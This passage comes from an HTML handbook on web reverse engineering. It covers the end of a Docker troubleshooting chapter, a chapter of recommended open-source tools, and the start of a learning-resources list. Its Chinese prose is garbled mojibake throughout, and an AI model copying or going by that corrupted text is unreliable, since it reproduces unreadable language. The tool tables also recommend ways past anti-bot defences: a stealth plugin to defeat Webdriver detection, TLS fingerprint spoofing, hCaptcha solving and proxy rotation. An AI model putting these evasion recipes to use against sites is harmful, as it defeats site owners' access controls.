    &quot;max-size&quot;: &quot;10m&quot;,
    &quot;max-file&quot;: &quot;3&quot;
  }
}
</code></pre>
<hr />
<h2>æ€§èƒ½ä¼˜åŒ–</h2>
<h3>å®¹å™¨å¯åŠ¨æ…¢</h3>
<pre><code class="language-dockerfile"># 1. å‡å°‘å±‚æ•°
# âŒ å¤šå±‚
RUN apt-get update
RUN apt-get install -y package1
RUN apt-get install -y package2

# âœ… åˆå¹¶å±‚
RUN apt-get update &amp;&amp; \
    apt-get install -y package1 package2 &amp;&amp; \
    rm -rf /var/lib/apt/lists/*

# 2. ä½¿ç”¨ç¼“å­˜
FROM python:3.11
WORKDIR /app

# å…ˆå®‰è£…ä¾èµ– (å˜åŒ–å°‘)
COPY requirements.txt .
RUN pip install -r requirements.txt

# å†å¤åˆ¶ä»£ç  (å˜åŒ–å¤š)
COPY . .

# 3. é¢„çƒ­é•œåƒ
docker pull myimage:latest
docker-compose pull
</code></pre>
<hr />
<h2>æ¸…ç†å’Œç»´æŠ¤</h2>
<h3>æ¸…ç† Docker èµ„æº</h3>
<pre><code class="language-bash"># æ¸…ç†æ‰€æœ‰æœªä½¿ç”¨çš„èµ„æº
docker system prune -a

# æ¸…ç†å®¹å™¨
docker container prune

# æ¸…ç†é•œåƒ
docker image prune -a

# æ¸…ç†å·
docker volume prune

# æ¸…ç†ç½‘ç»œ
docker network prune

# æŸ¥çœ‹ç£ç›˜ä½¿ç”¨
docker system df
</code></pre>
<hr />
<h2>è°ƒè¯•æŠ€å·§</h2>
<h3>1. ä½¿ç”¨ä¸´æ—¶å®¹å™¨</h3>
<pre><code class="language-bash"># è¿è¡Œä¸´æ—¶å®¹å™¨è°ƒè¯•
docker run -it --rm alpine sh

# æŒ‚è½½å·è°ƒè¯•
docker run -it --rm -v $(pwd):/data alpine sh
</code></pre>
<h3>2. è¦†ç›–å…¥å£ç‚¹</h3>
<pre><code class="language-bash"># è¦†ç›– CMD
docker run -it myimage bash

# è¦†ç›– ENTRYPOINT
docker run -it --entrypoint bash myimage
</code></pre>
<h3>3. æ£€æŸ¥ç½‘ç»œ</h3>
<pre><code class="language-bash"># è¿›å…¥å®¹å™¨æ£€æŸ¥
docker exec -it container_name bash

# æµ‹è¯•è¿æ¥
ping other_container
curl http://other_container:8080
telnet other_container 3306
</code></pre>
<hr />
<h2>ğŸ“š ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-55">Docker éƒ¨ç½²</a></li>
<li><a href="#section-71">Docker é…ç½®æ¨¡æ¿</a></li>
<li><a href="#section-56">ç›‘æ§å‘Šè­¦</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-81">
                                                <h2>[R80] GitHub Projects</h2>
                                                <h1>R80: å¼€æºé¡¹ç›®æ¨è</h1>
<h2>æ¦‚è¿°</h2>
<p>æœ¬ç« ç²¾é€‰äº† Web é€†å‘å·¥ç¨‹é¢†åŸŸçš„ä¼˜è´¨å¼€æºé¡¹ç›®ï¼Œæ¶µç›–å·¥å…·ã€æ¡†æ¶ã€åº“å’Œå­¦ä¹ èµ„æºã€‚è¿™äº›é¡¹ç›®å¯ä»¥å¸®åŠ©ä½ å¿«é€Ÿå…¥é—¨ã€æå‡æŠ€èƒ½ã€è§£å†³å®é™…é—®é¢˜ã€‚</p>
<hr />
<h2>æµè§ˆå™¨è‡ªåŠ¨åŒ–</h2>
<table>
<thead>
<tr>
  <th>é¡¹ç›®åç§°</th>
  <th>Stars</th>
  <th>è¯­è¨€</th>
  <th>ç®€ä»‹</th>
  <th>ä¸»è¦ç‰¹ç‚¹</th>
  <th>å®‰è£…å‘½ä»¤</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong><a href="https://github.com/puppeteer/puppeteer">Puppeteer</a></strong></td>
  <td>87k+</td>
  <td>JavaScript/TypeScript</td>
  <td>Google å®˜æ–¹ Chrome/Chromium è‡ªåŠ¨åŒ–åº“</td>
  <td>â€¢ å®˜æ–¹æ”¯æŒï¼ŒAPI ç¨³å®š<br>â€¢ æ€§èƒ½ä¼˜ç§€<br>â€¢ ç”Ÿæ€ä¸°å¯Œï¼ˆpuppeteer-extra æ’ä»¶ï¼‰</td>
  <td><code>npm install puppeteer</code></td>
</tr>
<tr>
  <td><strong><a href="https://github.com/microsoft/playwright">Playwright</a></strong></td>
  <td>63k+</td>
  <td>JavaScript/TypeScript</td>
  <td>å¾®è½¯å¼€å‘çš„è·¨æµè§ˆå™¨è‡ªåŠ¨åŒ–æ¡†æ¶</td>
  <td>â€¢ æ”¯æŒ Chromeã€Firefoxã€Safari<br>â€¢ å¹¶å‘èƒ½åŠ›å¼º<br>â€¢ ç§»åŠ¨ç«¯æ¨¡æ‹Ÿ<br>â€¢ ç½‘ç»œæ‹¦æˆªå’Œä¿®æ”¹</td>
  <td><code>npm install @playwright/test</code></td>
</tr>
<tr>
  <td><strong><a href="https://github.com/SeleniumHQ/selenium">Selenium</a></strong></td>
  <td>30k+</td>
  <td>å¤šè¯­è¨€</td>
  <td>æœ€æ—©çš„æµè§ˆå™¨è‡ªåŠ¨åŒ–æ¡†æ¶</td>
  <td>â€¢ æ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€<br>â€¢ æˆç†Ÿç¨³å®š<br>â€¢ ç¤¾åŒºåºå¤§</td>
  <td><code>pip install selenium</code></td>
</tr>
<tr>
  <td><strong><a href="https://github.com/berstend/puppeteer-extra">puppeteer-extra-plugin-stealth</a></strong></td>
  <td>6k+</td>
  <td>JavaScript</td>
  <td>Puppeteer åæ£€æµ‹æ’ä»¶</td>
  <td>â€¢ ç»•è¿‡ Webdriver æ£€æµ‹<br>â€¢ ä¼ªé€  Chrome ç‰¹å¾<br>â€¢ è‡ªåŠ¨è§„é¿å¸¸è§åçˆ¬è™«</td>
  <td><code>npm install puppeteer-extra-plugin-stealth</code></td>
</tr>
</tbody>
</table>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>: è‡ªåŠ¨åŒ–æµ‹è¯•ã€ç½‘é¡µæˆªå›¾/PDF ç”Ÿæˆã€çˆ¬è™«å¼€å‘ã€E2E æµ‹è¯•ã€ç»•è¿‡è‡ªåŠ¨åŒ–æ£€æµ‹</p>
<hr />
<h2>JavaScript åˆ†æ</h2>
<table>
<thead>
<tr>
  <th>é¡¹ç›®åç§°</th>
  <th>Stars</th>
  <th>è¯­è¨€</th>
  <th>ç®€ä»‹</th>
  <th>ä¸»è¦ç‰¹ç‚¹</th>
  <th>å®‰è£…å‘½ä»¤</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong><a href="https://github.com/babel/babel">Babel</a></strong></td>
  <td>43k+</td>
  <td>JavaScript</td>
  <td>JavaScript ç¼–è¯‘å™¨å’Œ AST å·¥å…·</td>
  <td>â€¢ å¼ºå¤§çš„ AST æ“ä½œèƒ½åŠ›<br>â€¢ ä¸°å¯Œçš„è½¬æ¢æ’ä»¶<br>â€¢ åæ··æ·†æ ¸å¿ƒå·¥å…·</td>
  <td><code>npm install @babel/core @babel/parser</code></td>
</tr>
<tr>
  <td><strong><a href="https://github.com/javascript-obfuscator/javascript-obfuscator">javascript-obfuscator</a></strong></td>
  <td>9k+</td>
  <td>JavaScript</td>
  <td>JavaScript ä»£ç æ··æ·†å·¥å…·</td>
  <td>â€¢ å¤šç§æ··æ·†é€‰é¡¹<br>â€¢ å­—ç¬¦ä¸²åŠ å¯†<br>â€¢ æ§åˆ¶æµå¹³å¦åŒ–</td>
  <td><code>npm install javascript-obfuscator</code></td>
</tr>
<tr>
  <td><strong><a href="https://github.com/j4k0xb/webcrack">webcrack</a></strong></td>
  <td>2k+</td>
  <td>TypeScript</td>
  <td>Webpack bundle åæ··æ·†å·¥å…·</td>
  <td>â€¢ è‡ªåŠ¨è¯†åˆ« Webpack æ‰“åŒ…<br>â€¢ æå–æ¨¡å—ä»£ç <br>â€¢ è¿˜åŸç›®å½•ç»“æ„</td>
  <td><code>npm install -g webcrack</code></td>
</tr>
<tr>
  <td><strong><a href="https://github.com/lelinhtinh/de4js">de4js</a></strong></td>
  <td>1.5k+</td>
  <td>JavaScript</td>
  <td>åœ¨çº¿ JavaScript åæ··æ·†å·¥å…·</td>
  <td>â€¢ æ”¯æŒå¤šç§æ··æ·†æ ¼å¼<br>â€¢ åœ¨çº¿ä½¿ç”¨ï¼Œæ— éœ€å®‰è£…<br>â€¢ å¯è§†åŒ–å±•ç¤º</td>
  <td>åœ¨çº¿ç‰ˆ: https://lelinhtinh.github.io/de4js/</td>
</tr>
</tbody>
</table>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>: JavaScript åæ··æ·†ã€ä»£ç è½¬æ¢ã€AST åˆ†æã€Webpack æ‰“åŒ…ä»£ç åˆ†æã€äº†è§£æ··æ·†æŠ€æœ¯</p>
<hr />
<h2>ç½‘ç»œæŠ“åŒ…ä¸åˆ†æ</h2>
<table>
<thead>
<tr>
  <th>é¡¹ç›®åç§°</th>
  <th>Stars</th>
  <th>è¯­è¨€</th>
  <th>ç®€ä»‹</th>
  <th>ä¸»è¦ç‰¹ç‚¹</th>
  <th>å®‰è£…å‘½ä»¤</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong><a href="https://github.com/mitmproxy/mitmproxy">mitmproxy</a></strong></td>
  <td>35k+</td>
  <td>Python</td>
  <td>å¼ºå¤§çš„ MITM ä»£ç†å·¥å…·</td>
  <td>â€¢ å‘½ä»¤è¡Œå’Œ Web ç•Œé¢<br>â€¢ æ”¯æŒ HTTP/HTTPS<br>â€¢ Python è„šæœ¬å®šåˆ¶<br>â€¢ è‡ªåŠ¨åŒ– API</td>
  <td><code>pip install mitmproxy</code></td>
</tr>
<tr>
  <td><strong><a href="https://github.com/avwo/whistle">Whistle</a></strong></td>
  <td>14k+</td>
  <td>JavaScript</td>
  <td>åŸºäº Node.js çš„æŠ“åŒ…è°ƒè¯•ä»£ç†å·¥å…·</td>
  <td>â€¢ Web å¯è§†åŒ–ç•Œé¢<br>â€¢ è§„åˆ™é…ç½®çµæ´»<br>â€¢ æ”¯æŒ HTTPSã€WebSocket<br>â€¢ æ’ä»¶æ‰©å±•</td>
  <td><code>npm install -g whistle &amp;&amp; w2 start</code></td>
</tr>
<tr>
  <td><strong><a href="https://github.com/ahmadnassri/har-validator">har-validator</a></strong></td>
  <td>140+</td>
  <td>JavaScript</td>
  <td>HAR (HTTP Archive) æ–‡ä»¶éªŒè¯å’Œè§£æ</td>
  <td>â€¢ éªŒè¯ HAR æ ¼å¼<br>â€¢ æå–è¯·æ±‚/å“åº”æ•°æ®<br>â€¢ å‘½ä»¤è¡Œå·¥å…·</td>
  <td><code>npm install har-validator</code></td>
</tr>
</tbody>
</table>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>: ç§»åŠ¨ç«¯æŠ“åŒ…ã€API åˆ†æã€è¯·æ±‚é‡æ”¾ã€å‰ç«¯è°ƒè¯•ã€API Mockã€è·¨åŸŸé—®é¢˜è°ƒè¯•ã€HAR æ–‡ä»¶åˆ†æ</p>
<hr />
<h2>åŠ å¯†ä¸è§£å¯†</h2>
<table>
<thead>
<tr>
  <th>é¡¹ç›®åç§°</th>
  <th>Stars</th>
  <th>è¯­è¨€</th>
  <th>ç®€ä»‹</th>
  <th>ä¸»è¦ç‰¹ç‚¹</th>
  <th>è®¿é—®æ–¹å¼</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong><a href="https://github.com/gchq/CyberChef">CyberChef</a></strong></td>
  <td>26k+</td>
  <td>JavaScript</td>
  <td>&quot;ç½‘ç»œç‘å£«å†›åˆ€&quot;ï¼Œæ•°æ®å¤„ç†å·¥å…·</td>
  <td>â€¢ 200+ æ“ä½œï¼ˆç¼–ç ã€åŠ å¯†ã€å‹ç¼©ç­‰ï¼‰<br>â€¢ æ‹–æ‹½å¼æ“ä½œæµç¨‹<br>â€¢ æ— éœ€ç¼–ç¨‹</td>
  <td>åœ¨çº¿ç‰ˆ: https://gchq.github.io/CyberChef/</td>
</tr>
<tr>
  <td><strong><a href="https://github.com/brix/crypto-js">crypto-js</a></strong></td>
  <td>15k+</td>
  <td>JavaScript</td>
  <td>JavaScript åŠ å¯†åº“</td>
  <td>â€¢ å¸¸ç”¨åŠ å¯†ç®—æ³•ï¼ˆMD5ã€SHAã€AESã€RSAï¼‰<br>â€¢ çº¯ JavaScript å®ç°<br>â€¢ æµè§ˆå™¨å’Œ Node.js é€šç”¨</td>
  <td><code>npm install crypto-js</code></td>
</tr>
</tbody>
</table>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>: æ•°æ®è½¬æ¢ã€åŠ å¯†è§£å¯†ã€æ ¼å¼åˆ†æã€åŠ å¯†ç®—æ³•è¯†åˆ«ã€å‚æ•°ç­¾åå¤ç°</p>
<hr />
<h2>æŒ‡çº¹è¯†åˆ«</h2>
<table>
<thead>
<tr>
  <th>é¡¹ç›®åç§°</th>
  <th>Stars</th>
  <th>è¯­è¨€</th>
  <th>ç®€ä»‹</th>
  <th>ä¸»è¦ç‰¹ç‚¹</th>
  <th>è®¿é—®æ–¹å¼</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong><a href="https://github.com/fingerprintjs/fingerprintjs">FingerprintJS</a></strong></td>
  <td>22k+</td>
  <td>TypeScript</td>
  <td>æµè§ˆå™¨æŒ‡çº¹è¯†åˆ«åº“</td>
  <td>â€¢ 99.5% å‡†ç¡®ç‡<br>â€¢ Canvas/WebGL/Audio æŒ‡çº¹<br>â€¢ å…è´¹å¼€æºç‰ˆæœ¬</td>
  <td><code>npm install @fingerprintjs/fingerprintjs</code></td>
</tr>
<tr>
  <td><strong><a href="https://github.com/abrahamjuliot/creepjs">creepjs</a></strong></td>
  <td>2k+</td>
  <td>JavaScript</td>
  <td>æµè§ˆå™¨æŒ‡çº¹å’Œç‰¹å¾æ£€æµ‹</td>
  <td>â€¢ æ£€æµ‹æµè§ˆå™¨ä¼ªé€ <br>â€¢ å±•ç¤ºæ‰€æœ‰æŒ‡çº¹ä¿¡æ¯<br>â€¢ åœ¨çº¿ Demo</td>
  <td>åœ¨çº¿ç‰ˆ: https://abrahamjuliot.github.io/creepjs/</td>
</tr>
</tbody>
</table>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>: äº†è§£æŒ‡çº¹æŠ€æœ¯ã€åæŒ‡çº¹æµ‹è¯•ã€æŒ‡çº¹æ£€æµ‹å’Œåˆ†æ</p>
<hr />
<h2>çˆ¬è™«æ¡†æ¶</h2>
<table>
<thead>
<tr>
  <th>é¡¹ç›®åç§°</th>
  <th>Stars</th>
  <th>è¯­è¨€</th>
  <th>ç®€ä»‹</th>
  <th>ä¸»è¦ç‰¹ç‚¹</th>
  <th>å®‰è£…å‘½ä»¤</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong><a href="https://github.com/scrapy/scrapy">Scrapy</a></strong></td>
  <td>52k+</td>
  <td>Python</td>
  <td>å¼ºå¤§çš„çˆ¬è™«æ¡†æ¶</td>
  <td>â€¢ å¼‚æ­¥é«˜æ€§èƒ½<br>â€¢ ä¸­é—´ä»¶å’Œç®¡é“ç³»ç»Ÿ<br>â€¢ åˆ†å¸ƒå¼çˆ¬è™«æ”¯æŒï¼ˆScrapy-Redisï¼‰<br>â€¢ ä¸°å¯Œçš„æ’ä»¶</td>
  <td><code>pip install scrapy</code></td>
</tr>
<tr>
  <td><strong><a href="https://github.com/apify/crawlee">crawlee</a></strong></td>
  <td>14k+</td>
  <td>TypeScript</td>
  <td>Node.js Web çˆ¬è™«å’ŒæŠ“å–åº“</td>
  <td>â€¢ æ”¯æŒ Puppeteer/Playwright<br>â€¢ è‡ªåŠ¨é‡è¯•å’Œé˜Ÿåˆ—ç®¡ç†<br>â€¢ ä»£ç†è½®æ¢<br>â€¢ TypeScript å‹å¥½</td>
  <td><code>npm install crawlee</code></td>
</tr>
</tbody>
</table>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>: å¤§è§„æ¨¡çˆ¬è™«é¡¹ç›®ã€ç°ä»£ JavaScript çˆ¬è™«</p>
<hr />
<h2>é€†å‘è¾…åŠ©å·¥å…·</h2>
<table>
<thead>
<tr>
  <th>é¡¹ç›®åç§°</th>
  <th>Stars</th>
  <th>è¯­è¨€</th>
  <th>ç®€ä»‹</th>
  <th>ä¸»è¦ç‰¹ç‚¹</th>
  <th>å®‰è£…/ä½¿ç”¨</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong><a href="https://github.com/lwthiker/curl-impersonate">curl-impersonate</a></strong></td>
  <td>6k+</td>
  <td>C</td>
  <td>ä¼ªé€ æµè§ˆå™¨ TLS æŒ‡çº¹çš„ curl</td>
  <td>â€¢ å®Œç¾æ¨¡æ‹Ÿ Chrome/Firefox TLS æŒ‡çº¹<br>â€¢ ç»•è¿‡ JA3 æ£€æµ‹<br>â€¢ å‘½ä»¤è¡Œå·¥å…·</td>
  <td><code>curl_chrome124 https://example.com</code></td>
</tr>
<tr>
  <td><strong><a href="https://github.com/encode/httpx">httpx</a></strong></td>
  <td>13k+</td>
  <td>Python</td>
  <td>ä¸‹ä¸€ä»£ Python HTTP å®¢æˆ·ç«¯</td>
  <td>â€¢ HTTP/2 å’Œ HTTP/3 æ”¯æŒ<br>â€¢ åŒæ­¥/å¼‚æ­¥ API<br>â€¢ è¿æ¥æ± </td>
  <td><code>pip install httpx</code></td>
</tr>
<tr>
  <td><strong><a href="https://github.com/psf/requests-html">requests-html</a></strong></td>
  <td>14k+</td>
  <td>Python</td>
  <td>ç»“åˆ Requests å’Œ PyQuery çš„ HTML è§£æåº“</td>
  <td>â€¢ JavaScript æ¸²æŸ“ï¼ˆå†…ç½® Chromiumï¼‰<br>â€¢ jQuery é£æ ¼é€‰æ‹©å™¨<br>â€¢ ç®€å•æ˜“ç”¨</td>
  <td><code>pip install requests-html</code></td>
</tr>
</tbody>
</table>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>: TLS æŒ‡çº¹ç»•è¿‡ã€ç°ä»£ HTTP è¯·æ±‚ã€éœ€è¦ JS æ¸²æŸ“çš„çˆ¬è™«</p>
<hr />
<h2>WebAssembly å·¥å…·</h2>
<table>
<thead>
<tr>
  <th>é¡¹ç›®åç§°</th>
  <th>Stars</th>
  <th>è¯­è¨€</th>
  <th>ç®€ä»‹</th>
  <th>ä¸»è¦å·¥å…·</th>
  <th>ä½¿ç”¨ç¤ºä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong><a href="https://github.com/WebAssembly/wabt">wabt</a></strong></td>
  <td>6k+</td>
  <td>C++</td>
  <td>WebAssembly Binary Toolkit</td>
  <td>â€¢ wasm2watï¼ˆäºŒè¿›åˆ¶è½¬æ–‡æœ¬ï¼‰<br>â€¢ wat2wasmï¼ˆæ–‡æœ¬è½¬äºŒè¿›åˆ¶ï¼‰<br>â€¢ wasm-objdumpï¼ˆåæ±‡ç¼–ï¼‰<br>â€¢ wasm-decompileï¼ˆåç¼–è¯‘ï¼‰</td>
  <td><code>wasm2wat module.wasm -o module.wat</code><br><code>wasm-decompile module.wasm -o module.c</code></td>
</tr>
</tbody>
</table>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>: Wasm é€†å‘åˆ†æã€Wasm ä»£ç åˆ†æ</p>
<hr />
<h2>æµè§ˆå™¨æ’ä»¶</h2>
<table>
<thead>
<tr>
  <th>æ’ä»¶åç§°</th>
  <th>Stars</th>
  <th>æ”¯æŒæµè§ˆå™¨</th>
  <th>ç®€ä»‹</th>
  <th>ä¸»è¦åŠŸèƒ½</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong><a href="https://github.com/Tampermonkey/tampermonkey">Tampermonkey</a></strong></td>
  <td>4k+</td>
  <td>Chromeã€Firefoxã€Safariã€Edge</td>
  <td>ç”¨æˆ·è„šæœ¬ç®¡ç†å™¨</td>
  <td>â€¢ æ³¨å…¥è‡ªå®šä¹‰ JavaScript<br>â€¢ è„šæœ¬å¸‚åœºï¼ˆGreasy Forkï¼‰<br>â€¢ è‡ªåŠ¨æ›´æ–°</td>
</tr>
<tr>
  <td><strong>EditThisCookie</strong></td>
  <td>-</td>
  <td>Chromeã€Firefox</td>
  <td>Cookie ç¼–è¾‘å·¥å…·</td>
  <td>â€¢ æŸ¥çœ‹/ç¼–è¾‘ Cookie<br>â€¢ å¯¼å…¥/å¯¼å‡º<br>â€¢ æœç´¢è¿‡æ»¤</td>
</tr>
<tr>
  <td><strong>JSON Viewer</strong></td>
  <td>-</td>
  <td>Chromeã€Firefox</td>
  <td>JSON æ ¼å¼åŒ–æµè§ˆå™¨æ’ä»¶</td>
  <td>â€¢ è¯­æ³•é«˜äº®<br>â€¢ æŠ˜å å±•å¼€<br>â€¢ æœç´¢è¿‡æ»¤</td>
</tr>
</tbody>
</table>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>: æ³¨å…¥ Hook è„šæœ¬ã€ä¿®æ”¹é¡µé¢è¡Œä¸ºã€è‡ªåŠ¨åŒ–æ“ä½œã€Cookie è°ƒè¯•å’Œç®¡ç†</p>
<hr />
<h2>éªŒè¯ç è¯†åˆ«</h2>
<table>
<thead>
<tr>
  <th>é¡¹ç›®åç§°</th>
  <th>Stars</th>
  <th>è¯­è¨€</th>
  <th>ç®€ä»‹</th>
  <th>ä¸»è¦ç‰¹ç‚¹</th>
  <th>å®‰è£…å‘½ä»¤</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong><a href="https://github.com/sml2h3/ddddocr">ddddocr</a></strong></td>
  <td>9k+</td>
  <td>Python</td>
  <td>å¸¦å¸¦å¼Ÿå¼Ÿ OCRï¼Œç®€å•éªŒè¯ç è¯†åˆ«</td>
  <td>â€¢ æ— éœ€è®­ç»ƒ<br>â€¢ è¯†åˆ«å‡†ç¡®ç‡é«˜<br>â€¢ æ”¯æŒæ»‘å—ç¼ºå£æ£€æµ‹</td>
  <td><code>pip install ddddocr</code></td>
</tr>
<tr>
  <td><strong><a href="https://github.com/QIN2DIM/hcaptcha-challenger">hcaptcha-challenger</a></strong></td>
  <td>700+</td>
  <td>Python</td>
  <td>hCaptcha è‡ªåŠ¨è¯†åˆ«</td>
  <td>â€¢ åŸºäº YOLOv8<br>â€¢ è‡ªåŠ¨åŒ–æµç¨‹</td>
  <td><code>pip install hcaptcha-challenger</code></td>
</tr>
</tbody>
</table>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>: ç®€å•éªŒè¯ç è¯†åˆ«ã€hCaptcha ç»•è¿‡</p>
<hr />
<h2>å­¦ä¹ èµ„æºé¡¹ç›®</h2>
<table>
<thead>
<tr>
  <th>é¡¹ç›®åç§°</th>
  <th>Stars</th>
  <th>è¯­è¨€</th>
  <th>ç®€ä»‹</th>
  <th>ä¸»è¦å†…å®¹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong><a href="https://github.com/lorien/awesome-web-scraping">awesome-web-scraping</a></strong></td>
  <td>7k+</td>
  <td>-</td>
  <td>Web çˆ¬è™«èµ„æºåˆé›†</td>
  <td>â€¢ çˆ¬è™«æ¡†æ¶<br>â€¢ ä»£ç†æœåŠ¡<br>â€¢ éªŒè¯ç è¯†åˆ«<br>â€¢ åçˆ¬è™«èµ„æº</td>
</tr>
<tr>
  <td><strong><a href="https://github.com/lydiahallie/javascript-questions">javascript-questions</a></strong></td>
  <td>61k+</td>
  <td>å¤šè¯­è¨€</td>
  <td>JavaScript è¿›é˜¶é—®é¢˜é›†</td>
  <td>â€¢ æ¶µç›–é—­åŒ…ã€åŸå‹é“¾ã€å¼‚æ­¥ç­‰<br>â€¢ é€é¢˜è§£ç­”<br>â€¢ é€‚åˆé¢è¯•å‡†å¤‡</td>
</tr>
<tr>
  <td><strong><a href="https://github.com/getify/You-Dont-Know-JS">You-Dont-Know-JS</a></strong></td>
  <td>178k+</td>
  <td>è‹±æ–‡</td>
  <td>æ·±å…¥ç†è§£ JavaScript ç³»åˆ—ä¹¦ç±</td>
  <td>â€¢ ä½œç”¨åŸŸä¸é—­åŒ…<br>â€¢ this ä¸å¯¹è±¡åŸå‹<br>â€¢ å¼‚æ­¥ä¸æ€§èƒ½<br>â€¢ ES6+ ç‰¹æ€§</td>
</tr>
</tbody>
</table>
<p><strong>ä½¿ç”¨åœºæ™¯</strong>: JavaScript åŸºç¡€åŠ å¼ºã€é¢è¯•å‡†å¤‡ã€æ·±å…¥ç†è§£ JavaScript</p>
<hr />
<h2>å…¶ä»–å®ç”¨å·¥å…·</h2>
<table>
<thead>
<tr>
  <th>å·¥å…·åç§°</th>
  <th>Stars</th>
  <th>è¯­è¨€</th>
  <th>ç®€ä»‹</th>
  <th>ä¸»è¦åŠŸèƒ½</th>
  <th>è®¿é—®æ–¹å¼</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong><a href="https://www.postman.com/">Postman</a></strong></td>
  <td>-</td>
  <td>-</td>
  <td>API å¼€å‘å’Œæµ‹è¯•å·¥å…·</td>
  <td>â€¢ è¯·æ±‚æ„é€ <br>â€¢ é›†åˆç®¡ç†<br>â€¢ ç¯å¢ƒå˜é‡<br>â€¢ è‡ªåŠ¨åŒ–æµ‹è¯•</td>
  <td>å®˜ç½‘ä¸‹è½½</td>
</tr>
<tr>
  <td><strong><a href="https://github.com/jqlang/jq">jq</a></strong></td>
  <td>30k+</td>
  <td>C</td>
  <td>å‘½ä»¤è¡Œ JSON å¤„ç†å™¨</td>
  <td>â€¢ å¼ºå¤§çš„è¿‡æ»¤å’Œè½¬æ¢<br>â€¢ ç®¡é“æ“ä½œ<br>â€¢ è½»é‡çº§</td>
  <td><code>brew install jq</code></td>
</tr>
</tbody>
</table>
<p><strong>ä½¿ç”¨ç¤ºä¾‹</strong>:</p>
<pre><code class="language-bash"># jq å¤„ç† JSON
curl https://api.example.com/data | jq '.items[] | .name'
</code></pre>
<hr />
<h2>å·¥å…·ç»„åˆæ–¹æ¡ˆ</h2>
<h3>æ–¹æ¡ˆä¸€ï¼šå…¨æ ˆçˆ¬è™«</h3>
<pre><code>Puppeteer + puppeteer-extra-plugin-stealth
    â†“
mitmproxyï¼ˆæŠ“åŒ…åˆ†æï¼‰
    â†“
Babelï¼ˆåæ··æ·†ï¼‰
    â†“
Python requests/httpxï¼ˆè¯·æ±‚å¤ç°ï¼‰
</code></pre>
<h3>æ–¹æ¡ˆäºŒï¼šé«˜æ€§èƒ½çˆ¬è™«</h3>
<pre><code>Scrapyï¼ˆæ¡†æ¶ï¼‰
    â†“
Scrapy-Redisï¼ˆåˆ†å¸ƒå¼ï¼‰
    â†“
ä»£ç†æ± ï¼ˆIP è½®æ¢ï¼‰
    â†“
æ¶ˆæ¯é˜Ÿåˆ—ï¼ˆä»»åŠ¡è°ƒåº¦ï¼‰
</code></pre>
<h3>æ–¹æ¡ˆä¸‰ï¼šJavaScript é€†å‘</h3>
<pre><code>Chrome DevToolsï¼ˆåŠ¨æ€è°ƒè¯•ï¼‰
    â†“
Babel + AST Explorerï¼ˆåæ··æ·†ï¼‰
    â†“
CyberChefï¼ˆæ•°æ®å¤„ç†ï¼‰
    â†“
Node.jsï¼ˆç®—æ³•å¤ç°ï¼‰
</code></pre>
<hr />
<h2>æŒç»­å…³æ³¨</h2>
<p>å»ºè®®å®šæœŸå…³æ³¨ä»¥ä¸‹èµ„æºï¼š</p>
<table>
<thead>
<tr>
  <th>èµ„æºåç§°</th>
  <th>é“¾æ¥</th>
  <th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>GitHub Trending</strong></td>
  <td>https://github.com/trending/javascript</td>
  <td>å‘ç°çƒ­é—¨é¡¹ç›®</td>
</tr>
<tr>
  <td><strong>Awesome Lists</strong></td>
  <td>https://github.com/sindresorhus/awesome</td>
  <td>ä¼˜è´¨èµ„æºåˆé›†</td>
</tr>
<tr>
  <td><strong>Reddit</strong></td>
  <td>r/webscraping</td>
  <td>ç¤¾åŒºè®¨è®º</td>
</tr>
<tr>
  <td><strong>Stack Overflow</strong></td>
  <td>æ ‡ç­¾ <code>web-scraping</code></td>
  <td>æŠ€æœ¯é—®ç­”</td>
</tr>
</tbody>
</table>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-82">å­¦ä¹ èµ„æº</a></li>
<li><a href="#section-15">æµè§ˆå™¨å¼€å‘è€…å·¥å…·</a></li>
<li><a href="#section-20">Puppeteer ä¸ Playwright</a></li>
<li><a href="#section-22">AST è§£æå·¥å…·</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-82">
                                                <h2>[R81] Learning Resources</h2>
                                                <h1>R81: å­¦ä¹ èµ„æº</h1>
<h2>æ¦‚è¿°</h2>
<p>æœ¬ç« æ±‡æ€»äº† Web é€†å‘å·¥ç¨‹é¢†åŸŸçš„ä¼˜è´¨å­¦ä¹ èµ„æºï¼ŒåŒ…æ‹¬ä¹¦ç±ã€è¯¾ç¨‹ã€åšå®¢ã€è§†é¢‘ã€ç»ƒä¹ å¹³å°ç­‰ï¼Œå¸®åŠ©ä½ ç³»ç»ŸåŒ–å­¦ä¹ å¹¶ä¸æ–­æå‡æŠ€èƒ½ã€‚</p>
<hr />
<h2>ä¹¦ç±æ¨è</h2>
<h3>Web å¼€å‘ä¸ JavaScript</h3>
<table>
<thead>
<tr>
  <th>ä¹¦å</th>
  <th>ä½œè€…</th>
  <th>éš¾åº¦</th>
  <th>æ¨èæŒ‡æ•°</th>
  <th>ä¸»è¦å†…å®¹</th>
  <th>é€‚åˆäººç¾¤</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>JavaScript é«˜çº§ç¨‹åºè®¾è®¡ï¼ˆç¬¬ 4 ç‰ˆï¼‰</strong></td>
  <td>Matt Frisbie</td>
  <td>â­â­â­</td>
